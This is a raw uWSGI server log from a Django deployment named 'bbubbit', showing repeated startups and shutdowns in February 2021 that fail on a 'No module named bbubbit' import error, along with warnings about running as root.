your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
SIGINT/SIGQUIT received...killing workers...
SIGINT/SIGQUIT received...killing workers...
Gracefully killing worker 1 (pid: 4272)...
SIGINT/SIGQUIT received...killing workers...
Gracefully killing worker 1 (pid: 4832)...
Gracefully killing worker 1 (pid: 3972)...
Gracefully killing worker 1 (pid: 4944)...
Gracefully killing worker 1 (pid: 4880)...
SIGINT/SIGQUIT received...killing workers...
Gracefully killing worker 1 (pid: 2708)...
SIGINT/SIGQUIT received...killing workers...
Gracefully killing worker 1 (pid: 2640)...
SIGINT/SIGQUIT received...killing workers...
SIGINT/SIGQUIT received...killing workers...
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
worker 1 buried after 1 seconds
goodbye to uWSGI.
worker 1 buried after 1 seconds
goodbye to uWSGI.
worker 1 buried after 1 seconds
goodbye to uWSGI.
worker 1 buried after 1 seconds
goodbye to uWSGI.
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
worker 1 buried after 2 seconds
goodbye to uWSGI.
worker 1 buried after 2 seconds
goodbye to uWSGI.
worker 1 buried after 2 seconds
goodbye to uWSGI.
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
WSGI app 0 (mountpoint='') ready in 312 seconds on interpreter 0x1aeb310 pid: 5002 (default app)
spawned uWSGI master process (pid: 5002)
spawned uWSGI worker 1 (pid: 5336, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 18:31:09 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x1b5f600
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x1b5f600 pid: 2023 (default app)
spawned uWSGI master process (pid: 2023)
spawned uWSGI worker 1 (pid: 2027, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 18:39:09 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x164c1c0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x164c1c0 pid: 2897 (default app)
spawned uWSGI master process (pid: 2897)
spawned uWSGI worker 1 (pid: 2901, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 18:39:18 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x24855a0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x24855a0 pid: 2919 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
spawned uWSGI master process (pid: 2919)
spawned uWSGI worker 1 (pid: 2923, cores: 1)
SIGINT/SIGQUIT received...killing workers...
SIGINT/SIGQUIT received...killing workers...
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
goodbye to uWSGI.
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
worker 1 buried after 1 seconds
goodbye to uWSGI.
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
worker 1 buried after 1 seconds
goodbye to uWSGI.
VACUUM: unix socket /home/dongkeydev/bbubbit/bbubbit.sock removed.
*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Feb  8 16:51:47 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1048576
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0xd38ab0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0xd38ab0 pid: 3187 (default app)
spawned uWSGI master process (pid: 3187)
spawned uWSGI worker 1 (pid: 3203, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Feb  8 16:54:21 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1048576
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0xd20570
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xd20570 pid: 3552 (default app)
spawned uWSGI master process (pid: 3552)
spawned uWSGI worker 1 (pid: 3556, cores: 1)
SIGINT/SIGQUIT received...killing workers...
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
goodbye to uWSGI.
VACUUM: unix socket /home/dongkeydev/bbubbit/bbubbit.sock removed.
worker 1 buried after 1 seconds
goodbye to uWSGI.
unlink(): No such file or directory [core/uwsgi.c line 1662]
